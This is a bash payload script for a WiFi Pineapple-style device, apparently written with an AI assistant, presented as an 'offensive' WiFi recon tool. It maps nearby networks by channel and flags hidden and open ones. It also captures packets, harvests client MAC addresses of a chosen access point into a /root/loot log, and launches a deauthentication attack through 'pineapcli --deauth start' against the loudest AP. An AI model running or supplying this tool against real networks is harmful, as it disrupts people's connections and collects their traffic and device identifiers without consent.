#!/bin/bash
# Title: Radio Heatmapper V6.1 (Stability Patch)
# Description: Ultimate Interactive WiFi Recon Multi-Tool (Offensive)
# Author: Josed (AI Assistant)
# Version: 6.1
# Category: Recon

# --- FRAMEWORK FAILSAFE ---
type LOG >/dev/null 2>&1 || LOG() { echo "[LOG] $1"; }
type LED >/dev/null 2>&1 || LED() { echo "[LED] $1 $2 $3"; }
type VIBRATE >/dev/null 2>&1 || VIBRATE() { :; }
type WAIT_FOR_INPUT >/dev/null 2>&1 || WAIT_FOR_INPUT() { sleep "${1:-1000}"ms; }

# State Variables
CURRENT_VIEW=0
RECORDING=0
PCAP_PID=""
SCAN_PID=""
DEAUTH_PID=""
TARGET_LOCKED=0
TARGET_MAC=""
TARGET_SSID=""
TARGET_CH=""
LAST_MOD_TIME=0

# --- Persistent Storage Paths ---
CLIENT_LOG="/root/loot/client_recon_$(date +%F).csv"

# History Graph Variables
H1=0; H2=0; H3=0; H4=0

# Flash Safety: RAM-backed filesystem paths
HEAT_TMP="/tmp"
HEAT_RAW="${HEAT_TMP}/heat_raw.txt"
HEAT_PARSED="${HEAT_TMP}/heat_parsed.txt"
HEAT_COUNTS="${HEAT_TMP}/heat_counts.txt"

# --- INTERFACE TOGGLES ---
set_monitor_mode() {
    local iface="${1:-wlan0}"
    ip link set "$iface" down 2>/dev/null
    iw dev "$iface" set type monitor 2>/dev/null
    ip link set "$iface" up 2>/dev/null
}

set_managed_mode() {
    local iface="${1:-wlan0}"
    ip link set "$iface" down 2>/dev/null
    iw dev "$iface" set type managed 2>/dev/null
    ip link set "$iface" up 2>/dev/null
}

cleanup() {
    stop_scanner
    set_managed_mode wlan0 
    rm -f "$HEAT_RAW" "${HEAT_RAW}.tmp" "$HEAT_PARSED" "${HEAT_PARSED}.tmp" "$HEAT_COUNTS"
    [ "$RECORDING" -eq 1 ] && kill -INT "$PCAP_PID" 2>/dev/null
    [ -n "$DEAUTH_PID" ] && { kill "$DEAUTH_PID" 2>/dev/null; wait "$DEAUTH_PID" 2>/dev/null; }
    pineapcli --deauth stop 2>/dev/null
    LED FINISH
}
trap cleanup EXIT INT TERM

LED SETUP
LOG "Starting Heatmapper V6.1..."
sleep 1

# --- HELPERS ---
chan_to_freq() {
    local ch="${1:-}"
    [ -z "$ch" ] && return
    if [ "$ch" -le 13 ] 2>/dev/null; then echo $(( 2407 + ch * 5 ))
    elif [ "$ch" -eq 14 ] 2>/dev/null; then echo 2484
    elif [ "$ch" -ge 36 ] 2>/dev/null; then echo $(( 5000 + ch * 5 ))
    fi
}

draw_bar() {
    local count=$1 scale=$2 bar="" draw
    draw=$(( count / scale ))
    [ "$count" -gt 0 ] && [ "$draw" -eq 0 ] && draw=1
    for ((i=0; i<draw; i++)); do bar="${bar}|"; done
    echo "$bar"
}

# --- PARSING ENGINE ---
parse_iw_data() {
    local scan_freq="${1:-}"
    if [ -n "$scan_freq" ]; then
        iw dev wlan0 scan freq "$scan_freq" > "${HEAT_RAW}.tmp" 2>/dev/null
    else
        iw dev wlan0 scan > "${HEAT_RAW}.tmp" 2>/dev/null
    fi
    mv "${HEAT_RAW}.tmp" "$HEAT_RAW"
    awk '
        /^BSS / {
            if (mac != "") {
                if (ssid == "") ssid="<Hidden>"
                if (enc == "") enc="Open"
                print mac "|" chan "|" rssi "|" enc "|" ssid "|" clients
            }
            mac=substr($2, 1, 17)
            chan="0"; rssi="-100"; ssid=""; enc=""; clients="0"
        }
        /primary channel:/ { chan=$4 }
        /signal:/ { rssi=$2 }
        /SSID:/ { 
            s=substr($0, index($0,$2))
            if (s != "\\x00" && length(s) > 0) ssid=s
        }
        /RSN:/ || /WPA:/ { enc="Secured" }
        /BSS Load:/ {
            getline
            if ($1 == "station" && $2 == "count:") clients=$3
        }
        END {
            if (mac != "") {
                if (ssid == "") ssid="<Hidden>"
                if (enc == "") enc="Open"
                print mac "|" chan "|" rssi "|" enc "|" ssid "|" clients
            }
        }
    ' "$HEAT_RAW" > "${HEAT_PARSED}.tmp"
    mv "${HEAT_PARSED}.tmp" "$HEAT_PARSED"
}

start_scanner() {
    local scan_freq="${1:-}"
    ( while true; do parse_iw_data "$scan_freq"; sleep 1; done ) &
    SCAN_PID=$!
}

stop_scanner() {
    [ -n "$SCAN_PID" ] && { kill "$SCAN_PID" 2>/dev/null; wait "$SCAN_PID" 2>/dev/null; SCAN_PID=""; }
}

# --- TOOLS ---
toggle_pcap() {
    if [ "$RECORDING" -eq 0 ]; then
        local rec_ch="$CH1"
        [ "$TARGET_LOCKED" -eq 1 ] && [ -n "$TARGET_CH" ] && rec_ch="$TARGET_CH"
        LOG "Starting PCAP on CH ${rec_ch}..."
        LED W BLINK
        stop_scanner
        iw dev wlan0 set channel "$rec_ch" 2>/dev/null
        tcpdump -i wlan0 -w "/root/loot/heatmap_capture_$(date +%s).pcap" 2>/dev/null &
        PCAP_PID=$!
        RECORDING=1; VIBRATE 100
    else
        LOG "Stopping PCAP..."
        kill -INT "$PCAP_PID" 2>/dev/null; wait "$PCAP_PID" 2>/dev/null; PCAP_PID=""
        LED FINISH
        RECORDING=0; VIBRATE 100
        [ "$TARGET_LOCKED" -eq 1 ] && start_scanner "$(chan_to_freq "$TARGET_CH")" || start_scanner
    fi
}

get_rec_flag() {
    local flags=""
    [ "$RECORDING" -eq 1 ] && flags="[REC]"
    [ "$TARGET_LOCKED" -eq 1 ] && flags="${flags}[TGT]"
    [ -n "$DEAUTH_PID" ] && kill -0 "$DEAUTH_PID" 2>/dev/null && flags="${flags}[ATK]"
    echo "$flags"
}

# --- VIEWS ---
view_trend() {
    local rc=$(get_rec_flag) scale=1 MAX_V=$H1
    LED B SOLID
    LOG "- Congestion Trend - ${rc}"
    for v in $H2 $H3 $H4; do [ "$v" -gt "$MAX_V" ] && MAX_V=$v; done
    [ "$MAX_V" -gt 12 ] && scale=$(( (MAX_V + 11) / 12 ))
    LOG "Now: $(draw_bar $H1 $scale) ($H1)"
    LOG "-3s: $(draw_bar $H2 $scale) ($H2)"
    LOG "-6s: $(draw_bar $H3 $scale) ($H3)"
    LOG "-9s: $(draw_bar $H4 $scale) ($H4)"
}

view_density() {
    local rc=$(get_rec_flag) TOP_APS
    LED M SOLID
    LOG "- LOUDEST APs - ${rc}"
    TOP_APS=$(sort -t '|' -k3 -nr "$HEAT_PARSED" | head -n 4)
    if [ -z "$TOP_APS" ]; then 
        LOG "No networks found."
    else
        echo "$TOP_APS" | while IFS='|' read -r m c r e s cli; do
            local p="S"; [ "$e" = "Open" ] && p="O"
            # Format: [RSSI] ENC CH SSID
            printf "[%2s] %s c%-2s %-8s\n" "${r#-}" "$p" "$c" "${s:0:8}"
        done
        LOG "----------------"
    fi
}

view_drill_down() {
    local ch=$1 rc=$(get_rec_flag) TOP_APS
    LED C SOLID
    TOP_APS=$(awk -F'|' -v ch="$ch" '$2 == ch {print $0}' "$HEAT_PARSED" | sort -t '|' -k3 -nr | head -n 4)
    LOG "- CH $ch DRILL - ${rc}"
    if [ -z "$TOP_APS" ]; then 
        LOG "No AP data found."
    else
        echo "$TOP_APS" | while IFS='|' read -r m c r e s cli; do
            local p="S"; [ "$e" = "Open" ] && p="O"; [ "$s" = "<Hidden>" ] && p="H"
            # Format: [RSSI] ENC SSID
            printf "[%2s] %s %-11s\n" "${r#-}" "$p" "${s:0:11}"
        done
        LOG "----------------"
    fi
}

view_clients() {
    local mac ssid rc ch OUT
    if [ "$TARGET_LOCKED" -eq 1 ]; then
        mac="$TARGET_MAC"; ssid="$TARGET_SSID"; ch="$TARGET_CH"
    else
        IFS='|' read -r mac ch _ _ ssid _ <<< "$(sort -t '|' -k3 -nr "$HEAT_PARSED" | head -n 1)"
    fi
    rc=$(get_rec_flag)
    [ -z "$mac" ] || [ -z "$ch" ] && return
    LOG "- ${ssid:0:9} CLI - ${rc}"
    LOG "Sniffing 2s..."
    stop_scanner
    set_monitor_mode wlan0
    iw dev wlan0 set channel "$ch" 2>/dev/null
    OUT=$(timeout 2s tcpdump -l -i wlan0 -nn -e -c 50 "type data and (wlan addr1 $mac or wlan addr2 $mac or wlan addr3 $mac)" 2>/dev/null | \
          awk -v t="$mac" '{
            for(i=1;i<=NF;i++){
                gsub(/,/, "", $i)
                if($i ~ /^[0-9a-fA-F]{2}(:[0-9a-fA-F]{2}){5}$/ && tolower($i) != tolower(t)) print tolower($i)
            }
          }' | sort -u | head -n 4)
    set_managed_mode wlan0
    if [ -z "$OUT" ]; then LOG "No active clients."; else
        mkdir -p /root/loot/ 2>/dev/null
        for m in $OUT; do 
            LOG "-> ${m:0:14}.."
            echo "$(date +%T),\"$ssid\",$mac,$m" >> "$CLIENT_LOG"
        done
    fi
    LOG "<- BACK (UP)"
    LED Y SOLID
    start_scanner "$(chan_to_freq "$ch")"
}

lock_target_and_deauth() {
    local ch=$1 mac ssid t_ch
    if [ "$CURRENT_VIEW" -eq 2 ] || [ "$CURRENT_VIEW" -eq 4 ]; then
        IFS='|' read -r mac t_ch _ _ ssid _ <<< "$(sort -t '|' -k3 -nr "$HEAT_PARSED" | head -n 1)"
    else
        IFS='|' read -r mac t_ch _ _ ssid _ <<< "$(awk -F'|' -v c="$ch" '$2 == c {print $0}' "$HEAT_PARSED" | sort -t '|' -k3 -nr | head -n 1)"
    fi
    [ -z "$mac" ] && return
    TARGET_LOCKED=1; TARGET_MAC="$mac"; TARGET_SSID="$ssid"; TARGET_CH="$t_ch"
    LOG "Target: ${ssid:0:10}"
    LOG "[UP]=ATK [DOWN]=CNCL"
    LED C SOLID
    while true; do
        local confirm=$(WAIT_FOR_INPUT 100 2>/dev/null)
        if [ "$confirm" = "UP" ]; then
            LOG "!!! ATTACKING !!!"; LED ATTACK; VIBRATE 1000
            ( pineapcli --add-mac "$mac" >/dev/null 2>&1
              pineapcli --deauth start >/dev/null 2>&1
              sleep 3
              pineapcli --deauth stop >/dev/null 2>&1 ) &
            DEAUTH_PID=$!
            break
        elif [ "$confirm" = "DOWN" ] || [ "$confirm" = "A" ]; then
            LOG "*** CANCELLED ***"; VIBRATE 100
            break
        fi
    done
    stop_scanner; start_scanner "$(chan_to_freq "$t_ch")"
}

view_main() {
    local rc=$(get_rec_flag) T1 T2 T3 C1 LCH HIDDEN OPEN L_SSID
    T1=$(sed -n '1p' "$HEAT_COUNTS"); T2=$(sed -n '2p' "$HEAT_COUNTS"); T3=$(sed -n '3p' "$HEAT_COUNTS")
    C1=$(echo "$T1" | awk '{print $1}'); LCH=$(echo "$T1" | awk '{print $2}')
    
    # NEW FAILSAFE: Only show CLEAR if the file itself is empty, not just C1 (V6.1)
    if [ ! -s "$HEAT_COUNTS" ]; then 
        LOG "-- HEATMAPPER -- ${rc}"
        LOG "STATUS: CLEAR"
        LED G SOLID
        return
    fi

    # Tactical Shorthand Logic
    HIDDEN=$(awk -F'|' -v c="$LCH" '$2 == c && $5 == "<Hidden>" {count++} END {print count+0}' "$HEAT_PARSED")
    OPEN=$(awk -F'|' -v c="$LCH" '$2 == c && $4 == "Open" {print "!"; exit}' "$HEAT_PARSED")
    L_SSID=$(awk -F'|' -v c="$LCH" '$2 == c {print $3 "|" $5}' "$HEAT_PARSED" | sort -t '|' -k1 -nr | head -n 1 | cut -d'|' -f2)

    LOG "-- NOISY CHS -- ${rc}"
    # Aligned output: Channel | AP Count | Hidden Count | Open Flag
    printf "CH %-2s: %2s APs (%sH) %s\n" "$LCH" "$C1" "$HIDDEN" "$OPEN"
    [ -n "$L_SSID" ] && LOG "> ${L_SSID:0:12}"
    
    [ -n "$T2" ] && printf "CH %-2s: %2s APs\n" "$(echo "$T2" | awk '{print $2}')" "$(echo "$T2" | awk '{print $1}')"
    [ -n "$T3" ] && printf "CH %-2s: %2s APs\n" "$(echo "$T3" | awk '{print $2}')" "$(echo "$T3" | awk '{print $1}')"
}

# --- MAIN ---
touch "$HEAT_PARSED"
start_scanner
while true; do
    CURR_MOD=$(stat -c %Y "$HEAT_PARSED" 2>/dev/null || echo 0)
    if [ "$CURR_MOD" -gt "$LAST_MOD_TIME" ]; then
        LAST_MOD_TIME=$CURR_MOD
        TOTAL=$(wc -l < "$HEAT_PARSED")
        H4=$H3; H3=$H2; H2=$H1; H1=$TOTAL
        awk -F'|' '{print $2}' "$HEAT_PARSED" | sort -n | uniq -c | sort -nr > "$HEAT_COUNTS"
    fi
    T1=$(sed -n '1p' "$HEAT_COUNTS")
    [ -n "$T1" ] && CH1=$(echo "$T1" | awk '{print $2}')
    C1=$(echo "$T1" | awk '{print $1}')

    # --- LED CONGESTION MAPPING (Main View) ---
    if [ "$CURRENT_VIEW" -eq 0 ]; then
        if [ -z "$C1" ] || [ "$C1" -le 5 ]; then LED G SOLID
        elif [ "$C1" -le 12 ]; then LED Y SOLID
        else LED R SOLID; fi
    fi

    case "$CURRENT_VIEW" in
        0) view_main ;; 1) view_trend ;; 2) view_density ;; 3) view_drill_down "$CH1" ;; 4) view_clients ;;
    esac
    
    INPUT=$(WAIT_FOR_INPUT 1000 2>/dev/null)
    case "$INPUT" in
        "LEFT")  [ "$CURRENT_VIEW" -eq 3 -o "$CURRENT_VIEW" -eq 4 ] && CURRENT_VIEW=0 || CURRENT_VIEW=1 ;;
        "RIGHT") [ "$CURRENT_VIEW" -eq 1 ] && CURRENT_VIEW=0 || CURRENT_VIEW=2 ;;
        "DOWN")  [ "$CURRENT_VIEW" -eq 2 ] && CURRENT_VIEW=4 || CURRENT_VIEW=3 ;;
        "UP")    [ "$CURRENT_VIEW" -eq 3 -o "$CURRENT_VIEW" -eq 4 -o "$CURRENT_VIEW" -eq 2 ] && CURRENT_VIEW=0 || lock_target_and_deauth "$CH1" ;;
        "B")     toggle_pcap ;;
        "A")     LOG "Exiting..."; break ;;
    esac
done
exit 0
